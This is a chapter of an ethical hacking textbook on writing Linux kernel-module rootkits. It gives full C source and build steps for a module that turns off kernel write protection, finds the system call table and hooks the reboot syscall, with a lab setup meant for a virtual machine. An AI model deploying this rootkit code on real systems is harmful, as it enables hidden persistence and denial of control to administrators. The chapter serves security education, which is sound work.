<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:ns="http://www.w3.org/2001/10/synthesis" lang="en-us" xml:lang="en-us">
	<head>
		<title>Ethical Hacking: A Hands-on Introduction to Breaking In</title>
		<link href="../styles/9781718501881.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:3776231c-affd-4772-8376-b44c973236be" name="Adept.expected.resource"/>
	</head>
	<body>
		<h2 class="h2" id="ch11"><span epub:type="pagebreak" id="page_221"/><strong><span class="big">11</span><br/>BUILDING AND INSTALLING LINUX ROOTKITS</strong></h2>
		<p class="verse"><em>Technology is nothing. What’s important is that you have a faith in people, that they’re basically good and smart, and if you give them tools, they’ll do wonderful things with them.</em></p>
		<p class="chap-au">–Steve Jobs</p>
		<div class="imagec">
			<img alt="image" src="../images/common.jpg"/>
		</div>
		<p class="noindents">Once hackers have gained access to a machine, they often want to remain undetected. One way to do this is to install a <em>rootkit</em>. A rootkit replaces parts of the operating system with the attacker’s code, which is sort of like pasting a photo of a room over a security camera. For example, a rootkit might replace the operating system function that lists all files with one that lists all files except those the hacker created. Thus, when an antivirus tool attempts to search for malicious files by reading the filesystem, it won’t find anything suspicious.</p>
		<p class="indent">In this chapter, you’ll modify the kernel on your Kali Linux machine by writing a Linux kernel module, a Linux operating system extension that <span epub:type="pagebreak" id="page_222"/>can be used to create a rootkit. Then you’ll override the operating system’s functions using a technique called <em>hooking</em>. We’ll use this hooking technique to write a rootkit that stops the system from rebooting and hides malicious files. We’ll conclude by using a Metasploit graphical user interface (GUI) called Armitage to scan a machine, exploit a vulnerability, and install a rootkit on it.</p>
		<h3 class="h3" id="ch11lev1"><strong>Writing a Linux Kernel Module</strong></h3>
		<p class="noindent">A common way attackers create rootkits is by exploiting a feature of the Linux operating system called <em>kernel modules</em>. This feature allows users to extend the operating system without recompiling or rebooting it. For example, when you connect a web camera to your system, the webcam’s installer adds software called a <em>driver</em> to the kernel. This driver enables the kernel to interact with your new hardware. The ability to insert and run code directly in the kernel makes kernel modules a great candidate for developing rootkits, which work best when integrated into the kernel.</p>
		<p class="indent">In this section, you’ll become familiar with how Linux kernel modules work by writing one yourself and running it on your Kali Linux virtual machine. The module you’ll create will log a message whenever you add or remove it.</p>
		<h4 class="h4" id="ch11lev2"><strong><em>Backing Up Your Kali Linux Virtual Machine</em></strong></h4>
		<p class="noindent">Any coding errors you make in your kernel module could result in kernel crashes, so first create a backup snapshot of your Kali Linux virtual machine so you can restore it in the event of a crash. <a href="ch11.xhtml#ch11fig1">Figure 11-1</a> provides instructions on how to do this.</p>
		<div class="image" id="ch11fig1">
			<img alt="image" src="../images/ch11fig01.jpg"/>
		</div>
		<p class="figcap"><em>Figure 11-1: How to create a snapshot</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_223"/>Select the Kali Linux machine from your list of virtual machines <span class="ent">➊</span> and then click <strong>Snapshots</strong>. Then select <strong>Take</strong> <span class="ent">➋</span>. Give your snapshot a name <span class="ent">➌</span> and then click <strong>OK</strong> <span class="ent">➍</span>.</p>
		<h4 class="h4" id="ch11lev3"><strong><em>Writing the Code</em></strong></h4>
		<p class="noindent">The kernel module code differs from the other programs we’ve covered in this book so far. First, instead of using Python, we’ll write our first kernel module in C. That’s because the Linux kernel is written in C, so kernel modules must also be written in C. Secondly, we won’t be able to use the standard C libraries (such as <span class="literal">unistd</span>, <span class="literal">stdio</span>, and <span class="literal">stdlib</span>), because user space libraries are not available in kernel mode. (I’ll discuss these two modes in the “System Calls” section of this chapter.)</p>
		<p class="indent">Another difference between most programs you may have written and kernel modules is that kernel modules are event driven. This means that instead of running sequentially, the program executes in response to events such as mouse clicks or keyboard interrupts. Kernel modules run in a privileged state, which means that they can access and change anything in the system.</p>
		<p class="indent">Every kernel module must respond to two events: <span class="literal">module_init()</span> and <span class="literal">module_exit()</span>. The <span class="literal">module_init()</span> event occurs when you add the module to the kernel, and the <span class="literal">module_exit()</span> event occurs when you remove the module from the kernel.</p>
		<p class="indent">To get started, create a Desktop folder called <em>lkm_rootkit</em>, and create two empty files, <em>hello.c</em> and <em>Makefile</em>, by running the following command:</p>
		<p class="programs">kali@kali:~/Desktop/lkm_rootkit$ <span class="codestrong1">touch hello.c Makefile</span></p>
		<p class="indent">Next, copy the following into <em>hello.c</em>:</p>
		<p class="programs">   #include &lt;linux/module.h&gt;<br/>
   #include &lt;linux/kernel.h&gt;<br/><span class="ent">➊</span> static int startup(void){<br/>
    <span class="ent">➋</span> printk(<span class="ent">➌</span> KERN_NOTICE  "Hello, Kernel Reporting for Duty!\n");<br/>
       return 0;<br/>
   }<br/><span class="ent">➍</span> static void shutdown(void){<br/>
      printk(KERN_NOTICE "Bye bye!\n");<br/>
   }<br/><span class="ent">➎</span> module_init(startup);<br/><span class="ent">➏</span> module_exit(shutdown);<br/>
   MODULE_LICENSE("GPL");</p>
		<p class="indent">Notice that there is no <span class="literal">main</span> method in this program. Instead, we define the function that runs in response to the <span class="literal">module_int</span> event <span class="ent">➊</span>, which calls the <span class="literal">printk()</span> function <span class="ent">➋</span>. Unlike a traditional user-level <span class="literal">printf()</span> method that prints to the console (remember that we don’t have a console when running in the kernel), the <span class="literal">printk()</span> method logs the value. Each log entry is associated with a log-level flag (for example, <span class="literal">KERN_NOTICE</span> <span class="ent">➌</span>). <a href="ch11.xhtml#ch11tab1">Table 11-1</a> lists the <span epub:type="pagebreak" id="page_224"/>various flags and their associated meanings. Next we define the function to run when the <span class="literal">module_exit</span> event is fired <span class="ent">➍</span>. Lastly, we register the functions with the <span class="literal">module_init</span> <span class="ent">➎</span> and <span class="literal">module_exit</span> <span class="ent">➏</span> events, respectively. These are the functions that will be run when the kernel module is loaded and removed, respectively. The <span class="literal">MODULE_LICENSE</span> tag is required for all Linux kernel modules. In this case, we are using the GNU General Public License (GPL).</p>
		<p class="tabcap" id="ch11tab1"><strong>Table 11-1:</strong> Kernel Log Flags</p>
		<table class="bordertb">
			<colgroup>
				<col style="width:40%"/>
				<col style="width:60%"/>
			</colgroup>
			<thead>
				<tr>
					<th class="borderb" style="vertical-align: top;">
						<p class="tab">Flag</p>
					</th>
					<th class="borderb" style="vertical-align: top;">
						<p class="tab">Description</p>
					</th>
				</tr>
			</thead>
			<tbody>
				<tr>
					<td style="vertical-align: top;">
						<p class="tab"><span class="literal">KERN_EMERG</span></p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">Emergency condition, system is probably dead</p>
					</td>
				</tr>
				<tr>
					<td class="bg-g" style="vertical-align: top;">
						<p class="tab"><span class="literal">KERN_ALERT</span></p>
					</td>
					<td class="bg-g" style="vertical-align: top;">
						<p class="tab">Some problem has occurred, immediate attention is needed</p>
					</td>
				</tr>
				<tr>
					<td style="vertical-align: top;">
						<p class="tab"><span class="literal">KERN_CRIT</span></p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">A critical condition</p>
					</td>
				</tr>
				<tr>
					<td class="bg-g" style="vertical-align: top;">
						<p class="tab"><span class="literal">KERN_ERR</span></p>
					</td>
					<td class="bg-g" style="vertical-align: top;">
						<p class="tab">An error has occurred</p>
					</td>
				</tr>
				<tr>
					<td style="vertical-align: top;">
						<p class="tab"><span class="literal">KERN_WARNING</span></p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">A warning</p>
					</td>
				</tr>
				<tr>
					<td class="bg-g" style="vertical-align: top;">
						<p class="tab"><span class="literal">KERN_NOTICE</span></p>
					</td>
					<td class="bg-g" style="vertical-align: top;">
						<p class="tab">Normal message to take note of</p>
					</td>
				</tr>
				<tr>
					<td style="vertical-align: top;">
						<p class="tab"><span class="literal">KERN_INFO</span></p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">Some information</p>
					</td>
				</tr>
				<tr>
					<td class="bg-g" style="vertical-align: top;">
						<p class="tab"><span class="literal">KERN_DEBUG</span></p>
					</td>
					<td class="bg-g" style="vertical-align: top;">
						<p class="tab">Debug information related to the program</p>
					</td>
				</tr>
			</tbody>
		</table>
		<p class="indent">Now that you’ve written your kernel module, let’s compile it.</p>
		<h4 class="h4" id="ch11lev4"><strong><em>Compiling and Running Your Kernel Module</em></strong></h4>
		<p class="noindent">The make file you’ll create (<em>Makefile</em>) will contain instructions the compiler will use to build the kernel module. Open <em>Makefile</em> in your favorite text editor, copy in the following, and then save the file:</p>
		<p class="programs"><span class="ent">➊</span> obj-m += hello.o<br/>
   all:<br/>
   <span class="ent">➋</span> make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules<br/><br/>
   clean:<br/>
      make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</p>
		<p class="indent">The first command <span class="ent">➊</span> tells the kernel’s build system to compile the file (<em>hello.c</em>) into an object file (<em>hello.o</em>). This build system passes the object file to software in the compiler’s pipeline called the <em>linker</em>, which fills in the addresses of the other libraries to which the module refers. Once the linking process has completed, the linker produces the final kernel module file, <em>hello.ko</em>. The make file asks the kernel build system to build all the modules in the current directory <span class="ent">➋</span>.</p>
		<p class="indent">Make sure that you have the Linux headers installed:</p>
		<p class="programs">kali@kali:~/Desktop/lkm_rootkit$ <span class="codestrong1">sudo apt install linux-headers-$(uname -r)</span></p>
		<p class="indent"><span epub:type="pagebreak" id="page_225"/>Then, run the <span class="literal">make</span> command in the <em>lkm_rootkit</em> directory to start the build process:</p>
		<p class="programs">kali@kali:~/Desktop/lkm_rootkit$ <span class="codestrong1">make</span><br/>make -C /lib/modules/5.4.0-kali4-amd64/build M=/home/kali/lkm_rootkit modules<br/>make[1]: Entering directory '/usr/src/linux-headers-5.4.0-kali4-amd64'<br/>
  CC [M]  /home/kali/lkm_rootkit/hello.o<br/>
  Building modules, stage 2.<br/>
  MODPOST 1 modules<br/>
  CC [M]  /home/kali/lkm_rootkit/hello.mod.o<br/>
  LD [M]  /home/kali/lkm_rootkit/hello.ko<br/>make[1]: Leaving directory '/usr/src/linux-headers-5.4.0-kali4-amd64'</p>
		<p class="indent">Next, run the following command to insert your Linux kernel module into the kernel:</p>
		<p class="programs">kali@kali:~/Desktop/lkm_rootkit$ <span class="codestrong1">sudo insmod hello.ko</span></p>
		<p class="indent">Each time you insert the module into the kernel, the Linux operating system will call the <span class="literal">__init</span> function. This module uses the <span class="literal">printk()</span> function to write the message <span class="literal">Hello, Kernel Reporting for Duty!</span> to the kernel logs <em>/var/log/syslog</em> and <em>/var/log/kern.log</em>. The kernel also includes these messages in the <em>kernel ring buffer</em>, which is a circular queue into which the kernel inserts messages it generates. Run the <span class="literal"><strong>dmesg</strong></span> command to view the messages:</p>
		<p class="programs">kali@kali:~/Desktop/lkm_rootkit$ <span class="codestrong1">sudo dmesg</span><br/>
[    0.000000] Linux version 5.7.0-kali1-amd64 (devel@kali.org) (gcc version<br/>
     
			<img alt="image" src="../images/arrow01.jpg"/>
			 9.3.0 (Debian 9.3.0-14), GNU ld (GNU Binutils for Debian) 2.34) #1 SMP<br/>
     
			<img alt="image" src="../images/arrow01.jpg"/>
			 Debian 5.7.6-1kali2<br/>
[    0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz-5.7.0-kali1-amd64 root=<br/>
     
			<img alt="image" src="../images/arrow01.jpg"/>
			 UUID=b1ce2f1a-ef90-47cd-ac50-0556d1ef12e1 ro quiet splash<br/>
[    0.000000] x86/fpu: x87 FPU will use FXSAVE<br/>
[    0.000000] BIOS-provided physical RAM map:<br/>
...</p>
		<p class="indent">As you can see, the kernel ring buffer contains a lot of debug information. Use the <span class="literal">grep</span> command to filter through the results:</p>
		<p class="programs">kali@kali:~/Desktop/lkm_rootkit$ <span class="codestrong1">sudo dmesg | grep 'Hello'</span><br/>
[ 2396.487566] Hello, Kernel Reporting for Duty!</p>
		<p class="indent">You can also view the last few messages logged by the kernel using the <span class="literal">tail</span> command:</p>
		<p class="programs">kali@kali:~/Desktop/lkm_rootkit$ <span class="codestrong1">sudo dmesg | tail</span></p>
		<p class="indent">Use the <span class="literal"><strong>lsmod</strong></span> command to view a list of all loaded kernel modules:</p>
		<p class="programs"> kali@kali:~/Desktop/lkm_rootkit$ <span class="codestrong1">sudo lsmod</span><br/>
   Module                  Size  Used by<br/><span class="ent">➊</span> hello                  16384  0<br/><br/>
   <span epub:type="pagebreak" id="page_226"/>fuse                  139264  5<br/>
   rfkill                 28672  2<br/>
   vboxsf                 94208  0<br/>
   joydev                 28672  0<br/>
   snd_intel8x0           49152  2<br/>
   snd_ac97_codec        155648  1 snd_intel8x0</p>
		<p class="indent">You should find the module you just installed <span class="ent">➊</span>. You’ve now successfully inserted code directly into the kernel using a kernel module! This means that you can now modify the kernel, bringing you one step closer to transforming your kernel module into a rootkit. You might be thinking: Won’t a system administrator be able to discover my rootkit by just listing the kernel modules as we just did? Well, yes, but later in this chapter I’ll discuss how to keep our module from showing up in this list.</p>
		<p class="indent">Use the <span class="literal">rmmod</span> command to remove your Linux kernel module:</p>
		<p class="programs">kali@kali:~/Desktop/lkm_rootkit$ <span class="codestrong1">sudo rmmod hello</span></p>
		<p class="indent">When you remove your kernel module, the operating system will call the <span class="literal">__exit</span> function and the module will log the <span class="literal">Bye bye!</span> message.</p>
		<div class="note">
			<p class="notet"><strong><span class="notes">NOTE</span></strong></p>
			<p class="notep"><em>You must be careful when implementing your module. Coding mistakes can cause your module to crash, and it will be difficult to remove the module. If this happens, reboot your virtual machine.</em></p>
		</div>
		<p class="indent">You can find further details about building Linux kernel modules at <em><a href="https://tldp.org/LDP/lkmpg/2.6/html/lkmpg.html">https://tldp.org/LDP/lkmpg/2.6/html/lkmpg.html</a></em>.</p>
		<h3 class="h3" id="ch11lev5"><strong>Modifying System Calls</strong></h3>
		<p class="noindent">In this section, we’ll look at how you can use kernel modules to create rootkits. In particular, you’ll learn how you can use them to hook into system calls. But first I must discuss what a system call is.</p>
		<h4 class="h4" id="ch11lev6"><strong><em>How System Calls Work</em></strong></h4>
		<p class="noindent">To prevent a malicious program from directly modifying the kernel, a computer’s processor divides the memory into two regions: <em>user space</em> and <em>kernel space</em>.</p>
		<p class="indent">When a user program runs, it uses the user space region of the memory. In contrast, kernel space memory can be accessed only when the processor is running in privileged mode. Switching to privileged mode requires special permissions, or privilege levels, which are stored in the last two bits of a special register called the <em>code segment (CS) register</em>. The processor checks the CS register whenever it fetches data from protected memory.</p>
		<p class="indent">Intel processors have four privilege levels: 3, 2, 1, and 0. Privilege level 3 is used by user programs, privilege levels 2 and 1 are used by device drivers, and privilege level 0 is used by the kernel. However, in practice, modern systems use only level 0 (kernel mode) and level 3 (user mode). The processor <span epub:type="pagebreak" id="page_227"/>will only fetch a memory section if the CS register’s privilege level allows it. <a href="ch11.xhtml#ch11fig2">Figure 11-2</a> shows how the CS register manages access to protected sections of memory and helps to enforce kernel space/user space segmentation.</p>
		<div class="image" id="ch11fig2">
			<img alt="image" src="../images/ch11fig02.jpg"/>
		</div>
		<p class="figcap"><em>Figure 11-2: Kernel space versus user space and code segment (CS) register</em></p>
		<p class="indent">Activities such as reading a file or accessing the network are considered privileged; therefore, the code associated with these activities is stored in kernel space. But you might be wondering how user-level programs like your browser access the network.</p>
		<p class="indent">Well, the processor provides a special instruction called a <em>system call (syscall)</em>. This instruction transfers control to the kernel, which then runs the appropriate function. To understand how a program activates one of these syscalls, consider the following program, which opens a file, writes the value 7, and then closes the file:</p>
		<p class="programs">#include &lt;stdio.h&gt;<br/>
#include &lt;stdlib.h&gt;<br/><br/>int main(){<br/>
   FILE *fptr = fopen("/tmp/file.txt","w");<br/>
   fprintf(fptr,"%d",7);<br/>
   fclose(fptr);<br/>
   return 0;<br/>
}</p>
		<p class="indent">All three operations, <span class="literal">open</span>, <span class="literal">write</span>, and <span class="literal">close</span>, are privileged; therefore, they must invoke syscalls. To see these calls in action, let’s look at a snippet of the assembly code associated with the <span class="literal">fclose()</span> function:</p>
		<p class="programs">   &lt;__close&gt;:<br/>
   ...<br/><span class="ent">➊</span> mov $0x03,%eax<br/><span class="ent">➋</span> syscall<br/><span epub:type="pagebreak" id="page_228"/><span class="ent">➌</span> cmp $0xfffffffffffff001,%rax<br/>
   ...<br/><span class="ent">➍</span> retq</p>
		<p class="indent">A program must follow these steps when using the syscall instruction. During the first step <span class="ent">➊</span>, the compiler moves the syscall number into the <span class="literal">%eax</span> CPU register. In this case, the value 3 represents the <span class="literal">close</span> system call. In the second step, the processor executes the <span class="literal">syscall</span> instruction <span class="ent">➋</span> and transfers control to the kernel. The kernel will use the number stored in the <span class="literal">%eax</span> register to index into the <em>system call table</em>, which is an array in kernel memory that stores pointers to kernel functions. <a href="ch11.xhtml#ch11fig3">Figure 11-3</a> shows an illustration of the system call table.</p>
		<div class="image" id="ch11fig3">
			<img alt="image" src="../images/ch11fig03.jpg"/>
		</div>
		<p class="figcap"><em>Figure 11-3: A visualisation of the system call table in memory</em></p>
		<p class="indent">When the function associated with the syscall completes, it places the return value in the <span class="literal">%rax</span> register and switches control back to the user program. During the third step <span class="ent">➌</span>, the user program checks the value in <span class="literal">%rax</span>. This value tells the user program whether the kernel function returned an error. Errors are indicated by a value of –1. If no errors occurred, the function completes and returns <span class="ent">➍</span>.</p>
		<p class="indent">To see a list of syscalls and their corresponding system call numbers, look at the <em>unistd_64.h</em> or <em>unistd_32.h</em> file on your system. Use the <span class="literal"><strong>find</strong></span> command to search the file’s root (<span class="literal">/</span>) directory, and the <span class="literal"><strong>-iname</strong></span> option to perform a case-insensitive search:</p>
		<p class="programs">   kali@kali:~/Desktop/lkm_rootkit$ <span class="codestrong1">sudo find / -iname unistd_64.h</span><br/>
   /usr/src/linux-headers-5.7.0-kali1-common/arch/sh/include/uapi/asm/unistd_64.h<br/>
   /usr/src/linux-headers-5.7.0-kali1-amd64/arch/x86/include/generated/uapi/asm/<br/>
       
			<img alt="image" src="../images/arrow01.jpg"/>
			 unistd_64.h<br/><span class="ent">➊</span> /usr/include/x86_64-linux-gnu/asm/unistd_64.h</p>
		<p class="indent">Select the last option <span class="ent">➊</span>, which is the library used by the GNU compiler and use the <span class="literal"><strong>cat</strong></span> command to list the file’s contents:</p>
		<p class="programs">   kali@kali:~/Desktop/lkm_rootkit$ <span class="codestrong1">cat /usr/include/x86_64-linux-gnu/asm/</span><br/>
      
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">unistd_64.h</span><br/><span epub:type="pagebreak" id="page_229"/>   #ifndef _ASM_X86_UNISTD_64_H<br/>
   #define _ASM_X86_UNISTD_64_H 1<br/><br/>
   #define __NR_read 0<br/>
   #define __NR_write 1<br/>
   #define __NR_open 2<br/><span class="ent">➊</span> #define __NR_close 3<br/>
   #define __NR_stat 4<br/>
   ...</p>
		<p class="indent">Notice that this file defines several constants, which store the system call numbers. For example, the <span class="literal">__NR_close</span> constant <span class="ent">➊</span> stores syscall number <span class="literal">3</span>. These constants allow us to write more readable programs. Instead of using arbitrary integers to index into the system call array (for instance, by writing <span class="literal">sys_call_table[3]</span>), we can use the predefined constant <span class="literal">sys_call_table[__NR_close]</span>.</p>
		<h4 class="h4" id="ch11lev7"><strong><em>Hooking Syscalls</em></strong></h4>
		<p class="noindent">Now that we’ve discussed syscalls and how they work, let’s discuss how we could design a rootkit that hooks one. <em>Hooking</em> is the process of overriding an entry in the system call table with a new pointer to the attacker’s function. <a href="ch11.xhtml#ch11fig4">Figure 11-4</a> shows a visual example of hooking the <span class="literal">read</span> syscall.</p>
		<div class="image" id="ch11fig4">
			<img alt="image" src="../images/ch11fig04.jpg"/>
		</div>
		<p class="figcap"><em>Figure 11-4: An overview of the hooking process</em></p>
		<p class="indent">The kernel module replaces the <span class="literal">read</span> entry in the system call table with a pointer to the hacker’s <span class="literal">read</span> function. Because your kernel module is a part of the kernel, it has access to all of the kernel’s memory and its variables. This means that it can access the kernel’s system call table, which is just an array in memory. Because your kernel module can read and write memory, it can also modify entries in this table or any other part of the kernel you choose.</p>
		<p class="indent">Often, instead of reimplementing the entire <span class="literal">read</span> function, an attacker can selectively call the original <span class="literal">read</span> function from within their new <span class="literal">read</span> function. Doing this allows them to selectively respond to reads. For example, <span epub:type="pagebreak" id="page_230"/>they might choose to modify some reads while allowing others to function normally. Or, they might block reads to their secret files while allowing other reads to function normally.</p>
		<h3 class="h3" id="ch11lev8"><strong>Hooking the Shutdown Syscall</strong></h3>
		<p class="noindent">Let’s write a kernel module that will prevent a user from performing a software-based system reboot. We’ll do this by modifying the kernel module you wrote earlier (<em>hello.c</em>) to hook the <span class="literal">__NR_reboot</span> syscall.</p>
		<p class="indent">Let’s begin by finding the address of the system call table in memory. You can usually get this address using the kernel’s <span class="literal">kallsyms_lookup_name</span> function; however, techniques for locating the system call table will vary depending on the kernel’s version. Here I discuss a method tested with Linux kernel version 5.7 running in a virtual machine.</p>
		<p class="indent">Copy the following C code to below the <span class="literal">#include</span> statements in your <em>hello.c</em> module:</p>
		<p class="programs">unsigned long *sys_call_table_address = kallsyms_lookup_name("sys_call_table");</p>
		<p class="indent">Once we have the system call table’s address, we can modify its entries. However, the system call table may be stored in a write-protected memory location that allows only reads. The processor will write these pages only if the <span class="literal">WP</span> (write protect) flag is 0 (false), so we must modify this flag, too.</p>
		<p class="indent">The write-protect flag is stored in the 17th bit of the Intel x86_64 processor’s 32-bit control register (cr0). The Linux kernel implements a function called <span class="literal">write_cr0</span>, which writes a value to the cr0 register. Instead of using this predefined Linux function, whose functionality varies depending on whether it is run in a virtual environment, we’ll write a function called <span class="literal">my_write_cr0</span> that explicitly executes assembly instructions to set the cr0 register:</p>
		<p class="programs">static long my_write_cr0(long value) {<br/>
    __asm__ volatile("mov %0, %%cr0" :: "r"(value) : "memory");<br/>
}</p>
		<p class="indent">Now we can disable the <span class="literal">WP</span> flag by bitwise AND-ing (<span class="literal">&amp;</span>) the register with a negation (<span class="literal">~</span>) of <span class="literal">0x10000</span>. This effectively sets the flag’s current value to 0:</p>
		<p class="programs">#define disable_write_protection() my_write_cr0(read_cr0() &amp; (~0x10000);</p>
		<p class="indent">Then we can reenable write protection; that is, set the bit back to one, by computing the bitwise OR between the register and the value <span class="literal">0x10000</span>:</p>
		<p class="programs">#define enable_write_protection()({my_write_cr0(read_cr0() | (0x10000));})</p>
		<p class="indent"><span epub:type="pagebreak" id="page_231"/>Now let’s write the C function that will allow our kernel module to hook the system call table:</p>
		<p class="programs">static void hook_reboot_sys_call(void *new_function){<br/>
 <span class="ent">➊</span> old_reboot_sys_call = sys_call_table_address[__NR_reboot];<br/>
    disable_write_protection();<br/>
 <span class="ent">➋</span> sys_call_table_address[__NR_reboot] = (unsigned long)new_function;<br/>
    enable_write_protection();<br/>
}</p>
		<p class="indent">First, we save a copy of the old reboot system call <span class="ent">➊</span>. We’ll need this to replace the old function pointer after we unload the module because we want the system to function normally when we remove it. Next, we disable write protection by calling the function we just wrote and update the <span class="literal">__NR_reboot</span> entry <span class="ent">➋</span> in the system call table to point to our new reboot function, which we’ll define in the following code snippet. Lastly, we’ll reenable write protection.</p>
		<p class="indent">Now let’s pull this all together into a single file. Copy the following into a new file called <em>reboot_blocker.c</em> and save it to the <em>lkm_rootkit</em> folder:</p>
		<p class="programs">  #include &lt;linux/module.h&gt;<br/>
  #include &lt;linux/init.h&gt;<br/>
  #include &lt;linux/kernel.h&gt;<br/>
  #include &lt;linux/kprobes.h&gt;<br/>
  #include &lt;linux/syscalls.h&gt;<br/>
  <br/>
  <br/>
  // Manually set the write bit<br/>
  static void my_write_cr0(long value) {<br/>
      __asm__ volatile("mov %0, %%cr0" :: "r"(value) : "memory");<br/>
  }<br/>
  <br/>
  #define disable_write_protection() my_write_cr0(read_cr0() &amp; (~0x10000))<br/>
  #define enable_write_protection() my_write_cr0(read_cr0() | (0x10000))<br/>
  #define enable_reboot 0<br/>
  <br/>
  unsigned long *sys_call_table_address;<br/>
  asmlinkage int (*old_reboot_sys_call)(int, int, int, void*);<br/>
  <br/>
  static struct kprobe kp = {<br/>
      .symbol_name = "kallsyms_lookup_name"<br/>
  };<br/>
  <br/>
  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);<br/>
  unsigned long * get_system_call_table_address(void){<br/>
      kallsyms_lookup_name_t kallsyms_lookup_name;<br/>
      register_kprobe(&amp;kp);<br/>
      kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;<br/>
      <span epub:type="pagebreak" id="page_232"/>unregister_kprobe(&amp;kp);<br/>
  unsigned long *address = (unsigned long*)kallsyms_lookup_name("sys_call_table");<br/>
      return address;<br/>
  }<br/>
  <br/>
  asmlinkage int hackers_reboot(int magic1, int magic2, int cmd, void *arg){<br/>
      if(enable_reboot){<br/>
         return old_reboot_sys_call(magic1, magic2, cmd, arg);<br/>
      }<br/>
      printk(KERN_NOTICE "EHROOTKIT: Blocked reboot Call");<br/>
      return EPERM;<br/>
  }<br/>
  <br/><span class="ent">➊</span> void hook_sys_call(void){<br/>
      old_reboot_sys_call = sys_call_table_address[__NR_reboot];<br/>
      disable_write_protection();<br/>
      sys_call_table_address[__NR_reboot] = (unsigned long) hackers_reboot;<br/>
      enable_write_protection();<br/>
      printk(KERN_NOTICE "EHROOTKIT: Hooked reboot Call");<br/>
  <br/>
  }<br/>
  <br/><span class="ent">➋</span> void restore_reboot_sys_call(void){<br/>
      disable_write_protection();<br/>
      sys_call_table_address[__NR_reboot] = (unsigned long) old_reboot_sys_call;<br/>
      enable_write_protection();<br/>
  }<br/>
  <br/>
  static int startup(void){<br/>
      sys_call_table_address = get_system_call_table_address();<br/>
      hook_sys_call();<br/>
      return 0;<br/>
  }<br/>
  static void __exit shutdown(void){<br/>
     restore_reboot_sys_call();<br/>
  }<br/>
  module_init(startup);<br/>
  module_exit(shutdown);<br/>
  MODULE_LICENSE("GPL");</p>
		<p class="indent">In addition to the hook function <span class="ent">➊</span>, we also include a function to restore the system call entry to its original value <span class="ent">➋</span>. We’ll call this function when we remove the module. We also define the <span class="literal">hackers_reboot()</span> function that will replace the reboot function in the system call table. This function has the same parameters as the kernel’s original reboot function.</p>
		<p class="indent"><span epub:type="pagebreak" id="page_233"/>You might be wondering what the <span class="literal">magic1</span> and <span class="literal">magic2</span> parameters represent. Well, because Linux is open source, we can view the system call’s source code in the <em>reboot.c</em> file. I’ve included a snippet of the code here:</p>
		<p class="programs">SYSCALL_DEFINE4(reboot, int, magic1, int, magic2, unsigned int, cmd,<br/>
      void __user *, arg)<br/>
{<br/>
...<br/>
   /* We only trust the superuser with rebooting the system. */<br/>
   if (!ns_capable(pid_ns-&gt;user_ns, CAP_SYS_BOOT))<br/>
      return -EPERM;<br/><br/>
   /* For safety, we require "magic" arguments. */<br/>
 <span class="ent">➊</span> if (magic1 != LINUX_REBOOT_MAGIC1 ||<br/>
         (magic2 != LINUX_REBOOT_MAGIC2 &amp;&amp; <span class="ent">➋</span> <br/>
         magic2 != LINUX_REBOOT_MAGIC2A &amp;&amp;<br/>
...</p>
		<p class="indent">The additional checks <span class="ent">➊</span> reduce the likelihood that a memory corruption error will cause the machine to reboot spontaneously. That’s because the memory corruption would need to affect both the system call table and all the constants <span class="ent">➋</span> for this type of error to occur. So what value did Linus Torvalds, the developer of Linux, choose for these constants? Take a look:</p>
		<p class="programs">LINUX_REBOOT_MAGIC1  4276215469  = 0xfee1dead<br/>LINUX_REBOOT_MAGIC2  672274793   = 0x28121969 (Linus Birthday)<br/>LINUX_REBOOT_MAGIC2A 85072278    = 0x05121996 (Birthday Kid 1)<br/>LINUX_REBOOT_MAGIC2B 369367448   = 0x16041998 (Birthday Kid 2)<br/>LINUX_REBOOT_MAGIC2C 537993216   = 0x20112000 (Birthday Kid 3)</p>
		<p class="indent">Torvalds chose his birthday and those of his three kids. These constants get checked to ensure that a memory corruption didn’t cause the shutdown: a great Linux Easter egg. Every time you shut down a Linux machine, remember that you need a little bit of magic.</p>
		<p class="indent">Returning to our code, the <span class="literal">cmd</span> parameter specifies the command shortcut CTRL-ALT-DELETE to trigger a shutdown. The final parameter is a pointer to the user. The Linux kernel uses this value to ensure that the user has proper privileges to shut down the machine.</p>
		<p class="indent">You’ll also notice that the function signature includes the <span class="literal">asmlinkage</span> macro. This macro tells the compiler to check the stack (a region of a program’s memory used to store variables temporarily) instead of the registers for the function’s parameters. This is because the <span class="literal">syscall</span> instruction places these parameters on the stack.</p>
		<p class="indent">We defined a constant called <span class="literal">enable_reboot</span>. Setting this constant to 1 allows the system to reboot, but setting it to 0 blocks the reboot call and returns the <span class="literal">EPERM</span> constant. This constant indicates that the user has insufficient permissions to reboot as we now control the system.</p>
		<p class="indent"><span epub:type="pagebreak" id="page_234"/>It’s time to compile the kernel module. Edit the first line in <em>Makefile</em> so that it targets the <em>reboot_blocker.c</em> file:</p>
		<p class="programs">obj-m += reboot_blocker.o</p>
		<p class="indent">Now install the kernel module:</p>
		<p class="programs">kali@kali:~/Desktop/lkm_rootkit$ <span class="codestrong1">sudo insmod reboot_blocker.ko</span></p>
		<p class="indent">Check the logs to make sure the kernel module is installed:</p>
		<p class="programs">kali@kali:~/Desktop/lkm_rootkit$ <span class="codestrong1">sudo dmesg | grep 'EHROOTKIT'</span></p>
		<p class="indent">To test it, do a software-based reboot of your Kali Linux system by running the following command in the terminal:</p>
		<p class="programs">kali@kali:~/Desktop/lkm_rootkit$ <span class="codestrong1">sudo reboot</span></p>
		<p class="indent">This should cause the GUI of your Kali Linux machine to shut down and return you to the Kali logo. However, the kernel has not shut down and can still be detected. In pfSense, ping your Kali Linux machine:</p>
		<p class="programs">kali@kali:~/Desktop/lkm_rootkit$ <span class="codestrong1">ping <span class="codeitalic">&lt;Kali IP address&gt;</span></span></p>
